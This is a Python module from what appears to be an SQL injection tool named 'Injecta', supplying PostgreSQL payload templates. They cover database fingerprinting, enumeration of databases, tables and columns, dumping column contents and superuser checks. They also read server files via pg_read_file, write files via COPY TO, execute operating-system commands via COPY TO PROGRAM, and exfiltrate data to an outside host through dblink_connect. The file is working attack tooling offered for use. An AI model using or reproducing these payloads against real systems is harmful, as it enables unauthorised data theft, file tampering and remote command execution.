"""
Injecta — PostgreSQL payload provider
"""
from typing import List


class PostgreSQLPayloads:
    name = "postgresql"
    comment = "-- "
    inline_comment = "/*!*/"
    substitution_char = "s"

    @staticmethod
    def version() -> List[str]:
        return [
            "SELECT version()",
            "SELECT current_setting('server_version')",
        ]

    @staticmethod
    def databases() -> List[str]:
        return [
            "SELECT string_agg(datname, ',') FROM pg_database",
        ]

    @staticmethod
    def tables(db: str) -> List[str]:
        return [
            f"SELECT string_agg(tablename, ',') FROM pg_tables WHERE schemaname='public'",
            "SELECT string_agg(tablename, ',') FROM pg_tables WHERE schemaname NOT IN ('pg_catalog', 'information_schema')",
        ]

    @staticmethod
    def columns(db: str, table: str) -> List[str]:
        return [
            f"SELECT string_agg(column_name, ',') FROM information_schema.columns WHERE table_name='{table}'",
        ]

    @staticmethod
    def dump_column(db: str, table: str, column: str, limit: int = 0) -> List[str]:
        q = f"SELECT {column} FROM {table}"
        if limit > 0:
            q += f" LIMIT {limit}"
        return [q]

    @staticmethod
    def current_user() -> List[str]:
        return ["SELECT current_user", "SELECT current_user;"]

    @staticmethod
    def current_db() -> List[str]:
        return ["SELECT current_database()"]

    @staticmethod
    def count_tables(db: str) -> List[str]:
        return ["SELECT COUNT(*) FROM pg_tables WHERE schemaname='public'"]

    @staticmethod
    def count_columns(db: str, table: str) -> List[str]:
        return [f"SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{table}'"]

    @staticmethod
    def count_rows(db: str, table: str) -> List[str]:
        return [f"SELECT COUNT(*) FROM {table}"]

    @staticmethod
    def banner() -> List[str]:
        return ["SELECT version()"]

    @staticmethod
    def is_dba() -> List[str]:
        return ["SELECT usesuper FROM pg_user WHERE usename=current_user"]

    @staticmethod
    def is_admin() -> List[str]:
        return ["SELECT usesuper FROM pg_user WHERE usename=current_user"]

    @staticmethod
    def privileges() -> List[str]:
        return ["SELECT grantee, privilege_type FROM information_schema.role_table_grants WHERE grantee=current_user"]

    @staticmethod
    def file_read(path: str) -> List[str]:
        return [
            f"SELECT pg_read_file('{path}')",
        ]

    @staticmethod
    def file_write(path: str, content: str) -> List[str]:
        escaped = content.replace("'", "''")
        return [
            f"COPY (SELECT E'{escaped}') TO '{path}'",
        ]

    @staticmethod
    def os_cmd(cmd: str) -> List[str]:
        return [
            f"COPY (SELECT 1) TO PROGRAM '{cmd}'",
        ]

    @staticmethod
    def oob_call(target: str, data: str) -> List[str]:
        return [
            f"SELECT dblink_connect('host={target} dbname={data}')",
        ]
